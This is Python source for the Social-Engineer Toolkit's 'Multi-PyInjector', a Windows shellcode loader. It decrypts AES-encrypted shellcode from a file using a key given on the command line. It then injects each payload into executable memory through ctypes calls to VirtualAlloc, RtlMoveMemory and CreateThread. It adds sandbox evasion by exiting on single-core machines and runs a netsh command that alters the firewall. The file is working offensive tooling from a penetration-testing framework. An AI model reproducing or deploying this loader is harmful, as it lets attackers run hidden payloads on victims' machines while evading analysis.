#
# The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
# Version: 0.4
#
# This will spawn only a seperate thread per each shellcode instance.
#
# Much cleaner and optimized code. No longer needs files and is passed via
# command line.
#
# Incorporates AES 256 Encryption when passing shellcode

import ctypes
import sys
import subprocess
import os
import base64
from Crypto.Cipher import AES
import multiprocessing
import threading

# added sandbox evasion here - most sandboxes use only 1 core
if multiprocessing.cpu_count() < 2:
    exit()

# define our shellcode injection code through ctypes


def injection(sc):
    sc = sc.decode("string_escape")
    sc = bytearray(sc)
    # Initial awesome code and credit found here:
    # http://www.debasish.in/2012_04_01_archive.html

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(sc)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(sc)))
    buf = (ctypes.c_char * len(sc)).from_buffer(sc)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(sc)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(ht), ctypes.c_int(-1))
if __name__ == '__main__':
    multiprocessing.freeze_support()
    subprocess.Popen("netsh advfirewall set global StatefulFTP disable",
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    # this will be our ultimate filename we use for the shellcode generate
    # by the Social-Engineer Toolkit
    try:

        # our file containing shellcode
        if len(sys.argv[1]) > 1:
            payload_filename = sys.argv[1]
            if os.path.isfile(payload_filename):
                fileopen = open(payload_filename, "r")
                sc = fileopen.read()

            # if we didn't file our shellcode path then exit out
            if not os.path.isfile(payload_filename):
                sys.exit()

        if len(sys.argv[2]) > 1:
            # this is our secret key for decrypting the AES encrypted traffic
            secret = sys.argv[2]
            secret = base64.b64decode(secret)
            # the character used for padding--with a block cipher such as AES, the value
            # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
            # used to ensure that your value is always a multiple of BLOCK_SIZE
            PADDING = '{'
            BLOCK_SIZE = 32
            # one-liner to sufficiently pad the text to be encrypted
            pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
            # one-liners to decrypt a string which will be our shellcode
            DecryptAES = lambda c, e: c.decrypt(
                base64.b64decode(e)).rstrip(PADDING)
            cipher = AES.new(secret)
            # our decrypted value for shellcode
            sc = DecryptAES(cipher, sc)
            # split our shellcode into a list
            sc = sc.split(",")

    # except an indexerror and allow it to continue forward
    except IndexError:
        sys.exit()

    jobs = []
    for payload in sc:
        if payload != "":
            p = multiprocessing.Process(target=injection, args=(payload,))
            jobs.append(p)
            p.start()
